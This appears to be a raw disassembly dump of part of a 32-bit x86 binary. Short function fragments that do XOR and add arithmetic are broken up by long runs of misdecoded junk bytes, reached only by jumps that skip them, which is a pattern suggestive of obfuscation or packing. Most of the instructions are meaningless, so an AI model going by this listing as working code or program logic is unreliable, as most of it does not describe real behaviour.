  40515d:	adc    ch,ch
  40515f:	jo     0x405147
  405161:	add    bh,BYTE PTR [edx+0x72]
  405164:	dec    WORD PTR [edx]
  405167:	pop    es
  405168:	adc    DWORD PTR ds:0x61ec2cc9,ebx
  40516e:	inc    eax
  40516f:	retf   0xb56d
  405172:	cmp    esp,esi
  405174:	or     DWORD PTR [ecx-0x31],eax
  405177:	cmp    DWORD PTR [edx],ecx
  405179:	inc    ecx
  40517a:	and    ecx,DWORD PTR [ebx]
  40517c:	dec    eax
  40517d:	aam    0x93
  40517f:	mov    eax,ds:0x66ce87e3
  405184:	inc    edx
  405185:	in     eax,dx
  405186:	xchg   edi,eax
  405187:	cmp    dl,dl
  405189:	jo     0x405113
  40518b:	int    0x42
  40518d:	lds    ecx,FWORD PTR [edi]
  40518f:	sub    bl,bh
  405191:	out    0xef,al
  405193:	shr    BYTE PTR [esp+ebx*8],1
  405196:	pop    ecx
  405197:	lahf   
  405198:	les    eax,FWORD PTR [ecx]
  40519a:	push   edx
  40519b:	push   ds
  40519c:	aad    0x31
  40519e:	or     al,0x48
  4051a0:	sbb    DWORD PTR [ebp-0x67],esi
  4051a3:	mov    ebp,0x73bcdbd5
  4051a8:	xchg   ebx,eax
  4051a9:	icebp  
  4051aa:	das    
  4051ab:	dec    esi
  4051ac:	enter  0x90c4,0xff
  4051b0:	pop    ss
  4051b1:	jnp    0x4051fd
  4051b3:	aam    0xbd
  4051b5:	xchg   edx,eax
  4051b6:	(bad)  
  4051ba:	cmp    ah,BYTE PTR [ebx]
  4051bc:	mov    ch,0xa5
  4051be:	mov    WORD PTR [esi-0x3234ad3b],?
  4051c4:	pop    edx
  4051c5:	cmp    cl,BYTE PTR [edi+0x1f]
  4051c8:	in     al,dx
  4051c9:	mov    BYTE PTR [edi+ebp*4+0x37],bl
  4051cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051ce:	clc    
  4051cf:	jns    0x4051bc
  4051d1:	sub    DWORD PTR [ebx*8+0x145e0577],edx
  4051d8:	lahf   
  4051d9:	std    
  4051da:	add    BYTE PTR ds:0xe3731c86,bh
  4051e0:	adc    ebp,DWORD PTR cs:[eax+0x3d669918]
  4051e7:	jae    0x4051bd
  4051e9:	sar    DWORD PTR ds:0xba528326,0xa3
  4051f0:	fst    st(0)
  4051f2:	ret    
  4051f3:	xor    ebp,DWORD PTR [eax+0x65]
  4051f6:	xlat   BYTE PTR ds:[ebx]
  4051f7:	sub    BYTE PTR ds:0x41e1e5a5,al
  4051fd:	push   esp
  4051fe:	mov    bl,0x4f
  405200:	fistp  DWORD PTR [ebp-0x23]
  405203:	fiadd  DWORD PTR [eax-0x67]
  405206:	adc    DWORD PTR ss:[esi],esi
  405209:	sub    edi,DWORD PTR [ebx]
  40520b:	pop    esi
  40520c:	dec    esi
  40520d:	sahf   
  40520e:	adc    BYTE PTR [ebx],dh
  405210:	pop    ds
  405211:	test   al,0xa9
  405213:	das    
  405214:	and    eax,0x85d55a72
  405219:	pop    eax
  40521a:	jmp    0x4597c1c2
  40521f:	ins    DWORD PTR es:[edi],dx
  405220:	jo     0x405250
  405222:	push   eax
  405223:	sub    BYTE PTR [ebx-0x76],ah
  405226:	push   edx
  405227:	into   
  405228:	retf   
  405229:	loop   0x405269
  40522b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40522c:	aas    
  40522d:	fisub  WORD PTR ds:0x42635202
  405233:	sub    eax,0x2ac8009a
  405238:	cmp    cl,BYTE PTR [ebx-0x5e]
  40523b:	repnz pop ss
  40523d:	cmovnp edi,DWORD PTR [eax-0x7d7d5c42]
  405244:	popa   
  405245:	jns    0x40520d
  405247:	xchg   edi,eax
  405248:	lods   al,BYTE PTR ds:[esi]
  405249:	cs mov ch,0x9b
  40524c:	push   ds
  40524d:	test   ebx,esp
  40524f:	add    esp,DWORD PTR [edx]
  405251:	xlat   BYTE PTR ds:[ebx]
  405252:	pusha  
  405253:	push   eax
  405254:	fldenv [ebp+0x5b987db5]
  40525a:	mov    edi,0xea168be8
  40525f:	repz mov ah,0xc4
  405262:	xor    esp,edx
  405264:	cmp    edi,ebx
  405266:	mov    edi,eax
  405268:	pop    eax
  405269:	scas   eax,DWORD PTR es:[edi]
  40526a:	push   ebx
  40526b:	xlat   BYTE PTR ds:[ebx]
  40526c:	dec    ecx
  40526d:	push   0x4b55e719
  405272:	push   0x27
  405274:	jne    0x4052da
  405276:	imul   ecx,DWORD PTR [ecx+0x22f03943],0x4f
  40527d:	add    eax,0x7e0004c0
  405282:	clc    
  405283:	add    eax,0x3011303b
  405288:	pushf  
  405289:	adc    BYTE PTR [ecx+edi*1],bl
  40528c:	cmp    ah,0xd5
  40528f:	fidiv  DWORD PTR [ebx+0x49aa71de]
  405295:	xchg   ebp,edx
  405297:	pop    esi
  405298:	in     al,0xf9
  40529a:	cmc    
  40529b:	add    al,0x34
  40529d:	adc    ebp,ecx
  40529f:	pop    esp
  4052a0:	mov    ch,0x16
  4052a2:	retf   0x55ea
  4052a5:	in     eax,0xc3
  4052a7:	push   ebp
  4052a8:	push   esi
  4052a9:	jmp    0x4052ce
  4052ab:	cmp    al,0x26
  4052ad:	sbb    al,0x3f
  4052af:	push   ss
  4052b0:	jbe    0x405308
  4052b2:	aas    
  4052b3:	push   0xffffffa5
  4052b5:	xchg   esp,eax
  4052b6:	jnp    0x4052b0
  4052b8:	dec    ebx
  4052b9:	outs   dx,DWORD PTR ds:[esi]
  4052ba:	clc    
  4052bb:	popa   
  4052bc:	adc    dl,bh
  4052be:	fdivr  st,st(7)
  4052c0:	out    dx,eax
  4052c1:	sub    eax,0x8fb5ff93
  4052c6:	enter  0xd9cb,0x54
  4052ca:	loopne 0x405274
  4052cc:	dec    esp
  4052cd:	push   esp
  4052ce:	jns    0x40530f
  4052d0:	xor    esi,edx
  4052d2:	add    eax,ecx
  4052d4:	add    esi,ecx
  4052d6:	imul   eax,esi
  4052d9:	jmp    0x40559d
  4052de:	mov    eax,DWORD PTR [ebp+0xc]
  4052e1:	mov    eax,DWORD PTR [eax+0x78]
  4052e4:	mov    DWORD PTR [ebp+0xc],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0x4]
  4052ea:	mov    esi,DWORD PTR [ebp-0x8]
  4052ed:	xor    eax,edx
  4052ef:	xor    esi,edx
  4052f1:	add    eax,ecx
  4052f3:	jmp    0x405577
  4052f8:	shl    DWORD PTR [ebx],0xe4
  4052fb:	add    al,0xe2
  4052fd:	ret    
  4052fe:	loope  0x4052e1
  405300:	and    esp,DWORD PTR [eax-0x232cfef8]
  405306:	adc    DWORD PTR [ebx],ecx
  405308:	(bad)  
  405309:	sub    dh,BYTE PTR [eax+0x70]
  40530c:	fnstcw WORD PTR [esi+0x70]
  40530f:	jo     0x4052b2
  405311:	inc    eax
  405312:	push   esi
  405313:	cdq    
  405314:	js     0x405388
  405316:	cmp    ecx,edx
  405318:	lods   eax,DWORD PTR ds:[esi]
  405319:	pushf  
  40531a:	add    DWORD PTR [edi+0x112ebea],edi
  405320:	std    
  405321:	jo     0x40539a
  405323:	mov    ds:0xe35bc8a5,eax
  405328:	mov    cl,0x5e
  40532a:	or     esp,0xfffffffc
  40532d:	and    al,0x9a
  40532f:	mov    esi,0xd5776af6
  405334:	(bad)  
  405335:	popf   
  405336:	adc    edi,DWORD PTR [edi-0x1dec2ac]
  40533c:	loopne 0x40537e
  40533e:	data16 test ch,ah
  405341:	jns    0x40535d
  405343:	repz in al,dx
  405345:	lahf   
  405346:	ret    0x544f
  405349:	sar    BYTE PTR [edi+0x1e1198e2],0x7
  405350:	ins    BYTE PTR es:[edi],dx
  405351:	ror    DWORD PTR [ecx+0x62d66d95],0x19
  405358:	es sbb esi,edi
  40535b:	sub    BYTE PTR [edx],bh
  40535d:	mov    al,0xcc
  40535f:	and    al,0xd8
  405361:	jnp    0x4053e0
  405363:	mov    ch,0x46
  405365:	mov    ch,0x81
  405367:	aaa    
  405368:	adc    BYTE PTR [ebx+0x1326cc6a],dl
  40536e:	xor    al,0xd4
  405370:	mov    dl,0xca
  405372:	mov    bl,0xc2
  405374:	imul   ecx,DWORD PTR [ebp-0x5089ca1],0x59
  40537b:	lahf   
  40537c:	call   0xe4ce:0x80254719
  405383:	cmc    
  405384:	jns    0x405315
  405386:	cmp    eax,0xdc703534
  40538b:	mov    ds:0x3a2cb604,eax
  405390:	stc    
  405391:	pop    ds
  405392:	sub    DWORD PTR [ecx],0xffffffc7
  405395:	dec    ebp
  405396:	jae    0x405405
  405398:	mov    al,0xe
  40539a:	mov    esp,0xdc5fce2e
  40539f:	popf   
  4053a0:	cmp    ecx,DWORD PTR [esi-0x52]
  4053a3:	mov    bh,0xa5
  4053a5:	and    ebp,DWORD PTR [ebp+0x58ba6e24]
  4053ab:	addr16 push eax
  4053ad:	mov    eax,ds:0x678fa435
  4053b2:	xchg   ebp,eax
  4053b3:	push   es
  4053b4:	fs mov ch,0xaa
  4053b7:	pop    esp
  4053b8:	outs   dx,BYTE PTR ds:[esi]
  4053b9:	ror    BYTE PTR [edx],cl
  4053bb:	xor    BYTE PTR [edx+ebp*2+0x786f7fc3],bh
  4053c2:	lods   eax,DWORD PTR ds:[esi]
  4053c3:	pushf  
  4053c4:	and    al,bh
  4053c6:	das    
  4053c7:	rol    BYTE PTR [eax],0x2e
  4053ca:	cmp    ecx,eax
  4053cc:	push   ss
  4053cd:	sbb    eax,0xf3f492a3
  4053d2:	push   0xb3403747
  4053d7:	ja     0x4053ac
  4053d9:	push   edi
  4053da:	jns    0x405451
  4053dc:	jg     0x405398
  4053de:	loopne 0x4053c9
  4053e0:	outs   dx,DWORD PTR ds:[esi]
  4053e1:	dec    edx
  4053e2:	jp     0x40538a
  4053e4:	dec    ebp
  4053e5:	cdq    
  4053e6:	mov    edx,0x14828006
  4053eb:	arpl   WORD PTR [esi+0x48],ax
  4053ee:	push   esp
  4053ef:	in     al,0xc2
  4053f1:	cmp    edi,ecx
  4053f3:	fcom   QWORD PTR ds:0xb4e4b1f7
  4053f9:	sbb    al,dl
  4053fb:	imul   DWORD PTR [ecx+0x274c25e0]
  405401:	call   0x6bb0f2d0
  405406:	push   edx
  405407:	sti    
  405408:	rcl    DWORD PTR [edx+0x14],cl
  40540b:	add    esp,ebx
  40540d:	iret   
  40540e:	or     BYTE PTR [edi-0x5c030003],dl
  405414:	adc    ebx,DWORD PTR [ecx-0x3a124ddc]
  40541a:	hlt    
  40541b:	jo     0x4053e5
  40541d:	mov    ebx,0xb7d4af5a
  405422:	inc    ecx
  405423:	shrd   DWORD PTR [edi],ebp,0x1e
  405427:	mov    esi,0x64b27fd2
  40542c:	popa   
  40542d:	rcl    DWORD PTR [ecx],1
  40542f:	into   
  405430:	into   
  405431:	mov    al,0x33
  405433:	fidiv  WORD PTR [ecx-0x7a050277]
  405439:	shr    bh,1
  40543b:	in     al,dx
  40543c:	xchg   ecx,eax
  40543d:	mov    bh,0x14
  40543f:	outs   dx,DWORD PTR ds:[esi]
  405440:	adc    eax,0x3ef0f28a
  405445:	fisttp WORD PTR [eax-0x7]
  405448:	mov    ch,0x2f
  40544a:	call   0x3f90:0xaa9f0024
  405451:	in     eax,dx
  405452:	mov    al,ds:0xec55ce69
  405457:	loop   0x405469
  405459:	or     DWORD PTR [edx],ebx
  40545b:	push   edx
  40545c:	cmp    DWORD PTR [edx-0x55],esp
  40545f:	ss inc ecx
  405461:	retf   0x57d9
  405464:	pcmpeqb mm0,QWORD PTR [ebx-0x580332ca]
  40546b:	dec    ecx
  40546c:	jecxz  0x405493
  40546e:	mul    DWORD PTR [eax-0x4e]
  405471:	call   0x8079a986
  405476:	mov    ebx,ss
  405478:	xor    DWORD PTR [eax],edx
  40547a:	inc    esi
  40547b:	pop    esp
  40547c:	or     al,0x29
  40547e:	not    ecx
  405480:	mov    ds:0xbd50d607,eax
  405485:	add    DWORD PTR [edi],ebp
  405487:	push   eax
  405488:	inc    edi
  405489:	adc    ah,BYTE PTR [esp+edx*2-0x48f9f982]
  405490:	cdq    
  405491:	pop    ecx
  405492:	xchg   ebx,eax
  405493:	stos   DWORD PTR es:[edi],eax
  405494:	ins    DWORD PTR es:[edi],dx
  405495:	mov    ecx,DWORD PTR [ebx+edi*1]
  405498:	(bad)  
  40549a:	jne    0x405505
  40549c:	pop    ebx
  40549d:	mov    dh,BYTE PTR [ecx]
  40549f:	cmp    ebx,DWORD PTR [eax-0x1b]
  4054a2:	xor    al,0xad
  4054a4:	out    0x61,eax
  4054a6:	mov    eax,0x6cb6a4d4
  4054ab:	adc    esi,DWORD PTR [edi+esi*8]
  4054ae:	test   al,0x55
  4054b0:	in     eax,0x1
  4054b2:	push   edi
  4054b3:	retf   
  4054b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054b5:	sub    bh,0x4f
  4054b8:	cs sbb edi,edx
  4054bb:	dec    ecx
  4054bc:	push   ebp
  4054bd:	dec    ebp
  4054be:	or     ebx,esi
  4054c0:	fdiv   st,st(6)
  4054c2:	in     eax,0x37
  4054c4:	stc    
  4054c5:	pop    esp
  4054c6:	xor    BYTE PTR ss:[eax],0x3f
  4054ca:	xchg   DWORD PTR [ebp-0x2e],edx
  4054cd:	mov    cl,0x86
  4054cf:	aam    0xcb
  4054d1:	mov    esp,0x57f273a3
  4054d6:	sub    DWORD PTR [eax-0x6d],eax
  4054d9:	daa    
  4054da:	push   0x80496bef
  4054df:	add    eax,DWORD PTR [ebx-0x2d474744]
  4054e5:	add    bh,bl
  4054e7:	xchg   ebp,eax
  4054e8:	(bad)  
  4054e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054ea:	add    eax,0xb582aa89
  4054ef:	idiv   BYTE PTR [esi+edi*1+0xc]
  4054f3:	retf   0xb0e8
  4054f6:	icebp  
  4054f7:	cmp    esp,ebp
  4054f9:	sbb    al,0x3f
  4054fb:	adc    edx,edi
  4054fd:	or     al,0xab
  4054ff:	mov    ch,0xec
  405501:	mov    ch,0x62
  405503:	loopne 0x4054c3
  405505:	xchg   edx,eax
  405506:	neg    DWORD PTR ds:0x63455dba
  40550c:	(bad)  
  40550d:	mov    edx,0xd7cb9f9b
  405512:	cdq    
  405513:	in     eax,dx
  405514:	fcomp  QWORD PTR [ebx]
  405516:	aad    0x3e
  405518:	loopne 0x4054d9
  40551a:	push   cs
  40551b:	adc    BYTE PTR [ebx],cl
  40551d:	adc    al,0x7
  40551f:	pushf  
  405520:	push   cs
  405521:	xlat   BYTE PTR ds:[ebx]
  405522:	imul   eax,DWORD PTR [ebx-0x48f85ae],0xcd605dd8
  40552c:	mov    ch,0xe
  40552e:	push   edi
  40552f:	adc    al,0x31
  405531:	mov    esp,0x974e5f00
  405536:	fcmovu st,st(4)
  405538:	mov    BYTE PTR [edx+0x15],cl
  40553b:	mov    ecx,0xe0f92e3e
  405540:	jne    0x405585
  405542:	inc    esi
  405543:	popa   
  405544:	xchg   esi,eax
  405545:	inc    esp
  405546:	shr    DWORD PTR ds:0x5567378c,cl
  40554c:	cmp    eax,0xd402cd51
  405551:	dec    esp
  405552:	push   ss
  405553:	push   eax
  405554:	das    
  405555:	imul   esp,DWORD PTR [ebx+0x3e79db55],0x58184e9e
  40555f:	cmp    DWORD PTR [esi-0x25ebb196],eax
  405565:	addr16 daa 
  405567:	ins    BYTE PTR es:[edi],dx
  405568:	push   0x7adc13f0
  40556d:	nop
  40556e:	dec    esi
  40556f:	out    dx,eax
  405570:	mov    edi,0xe6b5e122
  405575:	outs   dx,DWORD PTR ds:[esi]
  405576:	or     al,0x3
  405578:	icebp  
  405579:	imul   eax,esi
  40557c:	mov    esi,DWORD PTR [ebp+0xc]
  40557f:	cmp    esi,eax
  405581:	mov    eax,DWORD PTR [ebp-0x4]
  405584:	je     0x405047
  40558a:	xor    eax,edx
  40558c:	add    eax,ecx
  40558e:	mov    ecx,DWORD PTR [ebp+0xc]
  405591:	imul   eax,ecx
  405594:	add    eax,DWORD PTR [ebp+0x8]
  405597:	mov    DWORD PTR [ebp+0xc],eax
  40559a:	mov    eax,DWORD PTR [ebp+0xc]
  40559d:	pop    esi
  40559e:	leave  
  40559f:	ret    0x8
  4055a2:	push   ebp
  4055a3:	mov    ebp,esp
  4055a5:	push   ecx
  4055a6:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4055ad:	mov    eax,DWORD PTR [ebp-0x4]
  4055b0:	mov    edx,DWORD PTR [ebp+0x10]
  4055b3:	mov    ecx,0x7510855
  4055b8:	adc    DWORD PTR ds:0x434421,0x21da
  4055c2:	xor    eax,ecx
  4055c4:	add    eax,0x32729c
  4055c9:	and    DWORD PTR ds:0x4326fc,0x2b83
  4055d3:	mov    DWORD PTR [edx],eax
  4055d5:	mov    eax,ds:0x434439
  4055da:	mov    edx,DWORD PTR ds:0x43445d
  4055e0:	sub    eax,edx
  4055e2:	xor    eax,DWORD PTR [eax+edx*1]
  4055e5:	mov    eax,DWORD PTR [ebp+0xc]
  4055e8:	dec    edx
  4055e9:	xor    eax,ecx
  4055eb:	dec    edx
  4055ec:	jmp    0x405755
  4055f1:	loope  0x4055fe
  4055f3:	xchg   edi,eax
  4055f4:	fdiv   DWORD PTR [ebp+0x64]
  4055f7:	jno    0x405602
  4055f9:	add    DWORD PTR [edi-0x74],0xfc81e684
  405600:	sub    BYTE PTR [edi-0x3b8f8fd8],0x7f
  405607:	jo     0x405679
  405609:	loopne 0x4055a7
  40560b:	pop    eax
  40560c:	and    al,0xc5
  40560e:	stos   DWORD PTR es:[edi],eax
  40560f:	test   eax,0x4a9a16f1
  405614:	test   BYTE PTR ds:0x28ebd962,dh
  40561a:	xchg   al,dl
  40561c:	cwde   
  40561d:	pop    es
  40561e:	and    ah,ch
  405620:	ret    0x32e4
  405623:	out    0xde,al
  405625:	xlat   BYTE PTR ds:[ebx]
  405626:	inc    edx
  405627:	ins    BYTE PTR es:[edi],dx
  405628:	mov    dl,0x26
  40562a:	jle    0x4055fa
  40562c:	test   eax,0xc8d5887
  405631:	cmp    ah,BYTE PTR [edx]
  405633:	ficom  WORD PTR [ecx]
  405635:	xor    DWORD PTR [ebx],esi
  405637:	cwde   
  405638:	shl    DWORD PTR [edi],1
  40563a:	(bad)  
  40563b:	jmp    0xb68953d5
  405640:	lahf   
  405641:	mov    ecx,0x53eaa59c
  405646:	xlat   BYTE PTR ds:[ebx]
  405647:	pop    ebp
  405648:	mov    bl,0x21
  40564a:	mov    WORD PTR [edi+0x3f06f494],gs
  405650:	popf   
  405651:	jg     0x405671
  405653:	inc    eax
  405654:	or     al,ch
  405656:	lds    eax,FWORD PTR [eax-0x3f]
  405659:	adc    eax,0xa66a6b1b
  40565e:	ror    al,0xca
  405661:	cdq    
  405662:	push   0xb7b5e8de
  405667:	mov    ch,dh
  405669:	gs mov bh,cl
  40566c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40566d:	test   BYTE PTR [ebx+0x54],dh
  405670:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  405672:	mov    al,ds:0x88179e7d
  405677:	es inc ecx
  405679:	push   0xffffffe8
  40567b:	aaa    
  40567c:	cmp    dl,BYTE PTR [eax-0x6af5c4b9]
  405682:	jmp    0xaefbfa4c
  405687:	(bad)  
  405688:	pop    ebx
  405689:	stos   DWORD PTR es:[edi],eax
  40568a:	or     ebx,ebx
  40568c:	popf   
  40568d:	clc    
  40568e:	fwait
  40568f:	pop    esi
  405690:	fstp   QWORD PTR [eax-0x6c]
  405693:	mov    eax,0x8597e806
  405698:	inc    eax
  405699:	not    ah
  40569b:	jecxz  0x405694
  40569d:	mul    bl
  40569f:	push   edi
  4056a0:	clc    
  4056a1:	(bad)  
  4056a2:	dec    edx
  4056a3:	cmc    
  4056a4:	push   0x7578555b
  4056a9:	xchg   edx,eax
  4056aa:	and    bh,0xd7
  4056ad:	int    0x77
  4056af:	mov    gs,edi
  4056b1:	ficomp WORD PTR [ecx]
  4056b3:	fidiv  DWORD PTR [edi]
  4056b5:	ins    BYTE PTR es:[edi],dx
  4056b6:	fisubr DWORD PTR [ebp+0xf]
  4056b9:	and    dh,BYTE PTR [eax]
  4056bb:	rcr    BYTE PTR [edi+0x2aa057f],0xff
  4056c2:	or     ah,BYTE PTR [ecx+ebp*1]
  4056c5:	mov    esi,0xd63270bc
  4056ca:	add    ebx,ebp
  4056cc:	or     DWORD PTR [ecx],esi
  4056ce:	and    DWORD PTR [eax],ebx
  4056d0:	jno    0x40566a
  4056d2:	cmp    al,BYTE PTR [eax+ebx*4-0x66bdbf77]
  4056d9:	mov    ebx,0xbce32336
  4056de:	mul    BYTE PTR [eax-0x2e]
  4056e1:	loope  0x4056c4
  4056e3:	xchg   edi,eax
  4056e4:	xor    ch,ah
  4056e6:	retf   0xe3bc
  4056e9:	cld    
  4056ea:	mov    dh,0x96
  4056ec:	dec    edi
  4056ed:	adc    al,0x47
  4056ef:	sbb    edx,DWORD PTR [esi-0x78]
  4056f2:	fisttp QWORD PTR [edx-0x1dea5e9a]
  4056f8:	data16 xor BYTE PTR [ebx+0x1c524b7a],bl
  4056ff:	popf   
  405700:	retf   0x12e5
  405703:	je     0x40571d
  405705:	mov    cl,0xad
  405707:	mov    dh,0xec
  405709:	push   ss
  40570a:	mov    cl,0x37
  40570c:	out    dx,al
  40570d:	pop    ds
  40570e:	retf   0x275f
  405711:	rol    BYTE PTR [edi],0xcf
  405714:	fldenv [ebp-0x59]
  405717:	xchg   edx,eax
  405718:	and    BYTE PTR [ebx+0x37],0xd4
  40571c:	sub    BYTE PTR [ecx+0x5e],cl
  40571f:	add    DWORD PTR [ebx-0x4ed57033],edi
  405725:	les    ebx,FWORD PTR [edx+eiz*2]
  405728:	or     al,0xd5
  40572a:	rol    dl,1
  40572c:	fs loope 0x405778
  40572f:	pusha  
  405730:	adc    ecx,eax
  405732:	dec    esi
  405733:	pusha  
  405734:	fucomp st(2)
  405736:	push   eax
  405737:	pop    ds
  405738:	and    al,0x9d
  40573a:	ficom  DWORD PTR [ebx]
  40573c:	adc    DWORD PTR [eax-0x42e87fae],edx
  405742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405743:	call   0xf2af22ee
  405748:	ret    0x3ca7
  40574b:	aaa    
  40574c:	shl    BYTE PTR [esi+ebp*8],0xf
  405750:	sbb    edi,DWORD PTR [ebp+0x564e9de0]
  405756:	mov    esi,DWORD PTR [ebp+0x10]
  405759:	and    DWORD PTR ds:0x43436a,0x0
  405763:	mov    edx,DWORD PTR ds:0x43436a
  405769:	inc    edx
  40576a:	mov    DWORD PTR ds:0x43436a,edx
  405770:	cmp    DWORD PTR ds:0x43436a,0x22
  405777:	jne    0x405789
  40577d:	push   DWORD PTR [ebp-0xc]
  405780:	push   DWORD PTR [ebp-0x24]
  405783:	call   DWORD PTR ds:0x4329c2
  405789:	cmp    DWORD PTR ds:0x43436a,0x1c
  405790:	jb     0x405763
  405796:	mov    edx,0x32729c
  40579b:	adc    DWORD PTR ds:0x432dbe,0x43438a
  4057a5:	add    eax,edx
  4057a7:	mov    DWORD PTR [esi+0x4],eax
  4057aa:	movzx  eax,BYTE PTR ds:0x4326f4
  4057b1:	and    eax,DWORD PTR ds:0x43439a
  4057b7:	mov    ds:0x4326f4,eax
  4057bc:	mov    eax,DWORD PTR [ebp+0x14]
  4057bf:	mov    DWORD PTR ds:0x43437e,0x718d
  4057c9:	mov    esi,DWORD PTR [ebp+0x10]
  4057cc:	xor    DWORD PTR ds:0x432704,0x2330
  4057d6:	mov    DWORD PTR [esi+0x8],eax
  4057d9:	mov    eax,DWORD PTR [ebp+0x18]
  4057dc:	mov    esi,DWORD PTR [ebp+0x10]
  4057df:	mov    DWORD PTR [esi+0xc],eax
  4057e2:	mov    eax,DWORD PTR [ebp+0x1c]
  4057e5:	mov    esi,DWORD PTR [ebp+0x10]
  4057e8:	mov    DWORD PTR [esi+0x10],eax
  4057eb:	mov    eax,eax
  4057ed:	jmp    0x405956
  4057f2:	hlt    
  4057f3:	and    BYTE PTR [ecx],bl
  4057f5:	arpl   cx,sp
  4057f7:	jno    0x40586b
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    al,ds:0x71519e0f
  4057ff:	sub    DWORD PTR [eax+0x70377361],esp
  405805:	jo     0x4057cb
  405807:	jg     0x405879
  405809:	jo     0x4057f9
  40580b:	xchg   edx,eax
  40580c:	dec    eax
  40580d:	bound  esi,QWORD PTR [edx]
  40580f:	and    BYTE PTR [eax-0x61],ch
  405812:	pop    DWORD PTR [esp+ebp*4]
  405815:	retf   0x2aaf
  405818:	fadd   st(5),st
  40581a:	sti    
  40581b:	sub    al,0x95
  40581d:	mov    al,0xb8
  40581f:	or     al,0xc9
  405821:	cwde   
  405822:	aad    0xe0
  405824:	mov    dh,0xc5
  405826:	inc    esi
  405827:	gs pop ecx
  405829:	pop    esi
  40582a:	push   cs
  40582b:	cwde   
  40582c:	xchg   ebp,eax
  40582d:	in     al,0xde
  40582f:	add    DWORD PTR [ebx],edx
  405831:	cmp    DWORD PTR [edx+0x323c4a63],ebp
  405837:	ss push ds
  405839:	rcl    DWORD PTR [ebp+0x3d],cl
  40583c:	xlat   BYTE PTR ds:[ebx]
  40583d:	mov    DWORD PTR [ecx+ecx*8-0x19a7c3e1],edx
  405844:	cdq    
  405845:	mov    ebx,0xbf732caa
  40584a:	out    dx,eax
  40584b:	pop    edx
  40584c:	and    bl,BYTE PTR [eax+0x5f]
  40584f:	push   esi
  405850:	cli    
  405851:	repnz cli 
  405853:	outs   dx,BYTE PTR ds:[esi]
  405854:	sub    al,0xec
  405856:	cld    
  405857:	das    
  405858:	(bad)  
  405859:	dec    esp
  40585a:	xor    esp,DWORD PTR [ebp-0x34d9524]
  405860:	pop    ss
  405861:	sbb    BYTE PTR fs:[edx-0x53],bh
  405865:	xchg   ecx,eax
  405866:	test   eax,0x1dcdd4dd
  40586b:	mov    al,0x76
  40586d:	test   DWORD PTR [esi-0x78],esp
  405870:	(bad)
  405873:	sbb    al,0x9
  405875:	and    DWORD PTR [ecx],eax
  405877:	mov    edi,eax
  405879:	(bad)  
  40587a:	push   ebp
  40587b:	inc    edx
  40587c:	cld    
  40587d:	sub    DWORD PTR [ebp-0x541c11bb],0xffffffb8
  405884:	add    eax,0x26e4a036
  405889:	or     al,cl
  40588b:	jge    0x405826
  40588d:	push   edx
  40588e:	jns    0x4058ab
  405890:	and    ebp,DWORD PTR [edi+0x5f]
  405893:	xor    al,BYTE PTR [eax]
  405895:	and    al,0x57
  405897:	jmp    0x336a:0xdd6293d2
  40589e:	pop    ebp
  40589f:	and    bh,ch
  4058a1:	mov    bh,0xfa
  4058a3:	push   ebp
  4058a4:	xchg   esp,eax
  4058a5:	mov    dh,0x49
  4058a7:	pop    edi
  4058a8:	mov    ecx,0x854eb28
  4058ae:	(bad)  
  4058af:	in     eax,dx
  4058b0:	es ins DWORD PTR es:[edi],dx
  4058b2:	rol    DWORD PTR [eax-0x78],cl
  4058b5:	enter  0xb78,0xbf
  4058b9:	sbb    eax,0x2b681130
  4058be:	adc    eax,DWORD PTR [esi]
  4058c0:	(bad)  
  4058c2:	cmp    ah,cl
  4058c4:	fidiv  WORD PTR [ebx+0x3fc9387]
  4058ca:	dec    eax
  4058cb:	cli    
  4058cc:	push   0x2a
  4058ce:	sub    BYTE PTR [edx],cl
  4058d0:	dec    edx
  4058d1:	std    
  4058d2:	jbe    0x405868
  4058d4:	lods   eax,DWORD PTR ds:[esi]
  4058d5:	push   es
  4058d6:	add    ebp,DWORD PTR [ecx]
  4058d8:	in     al,0x51
  4058da:	aas    
  4058db:	retf   
  4058dc:	push   0x0
  4058de:	inc    dx
  4058e0:	in     eax,dx
  4058e1:	scas   al,BYTE PTR es:[edi]
  4058e2:	or     bh,BYTE PTR [ebp-0x6c]
  4058e5:	xchg   edx,eax
  4058e6:	sub    dl,BYTE PTR [esi+0x670cc206]
  4058ec:	in     eax,0x67
  4058ee:	repnz pushf 
  4058f0:	inc    esi
  4058f1:	aam    0x90
  4058f3:	adc    ch,dl
  4058f5:	dec    ebp
  4058f6:	xor    al,0x49
  4058f8:	outs   dx,DWORD PTR ds:[esi]
  4058f9:	call   0x8335:0x6fa45896
  405900:	add    BYTE PTR ds:0xa9fb2594,cl
  405906:	or     DWORD PTR [edx+0x1d],esp
  405909:	fdivp  st(5),st
  40590b:	aad    0x57
  40590d:	push   ds
  40590e:	mov    ebp,0x7866d779
  405913:	or     esp,DWORD PTR ds:0x4ac9cc89
  405919:	sbb    eax,0xf40aa82a
  40591e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40591f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405920:	and    bl,bl
  405922:	add    bl,cl
  405924:	jae    0x405948
  405926:	je     0x5425392b
  40592c:	mov    esp,0x526e7a1a
  405931:	and    al,0x62
  405933:	fmul   QWORD PTR [edi]
  405935:	inc    esp
  405936:	shl    DWORD PTR [esp+eiz*8],cl
  405939:	(bad)  
  40593a:	jo     0x4058bc
  40593c:	enter  0xab29,0x39
  405940:	jbe    0x405962
  405942:	sbb    BYTE PTR [edx-0x5c],0x7
  405946:	lods   eax,DWORD PTR es:[esi]
  405948:	dec    esp
  405949:	adc    BYTE PTR [ecx],bl
  40594b:	out    0xdd,al
  40594d:	loopne 0x40596b
  40594f:	(bad)  
  405950:	aas    
  405951:	sbb    cl,bh
  405953:	cmp    DWORD PTR [ecx+0x8458b4f],esi
  405959:	xor    eax,ecx
  40595b:	add    eax,edx
  40595d:	pop    esi
  40595e:	leave  
  40595f:	ret    0x18
  405962:	push   ebp
  405963:	mov    ebp,esp
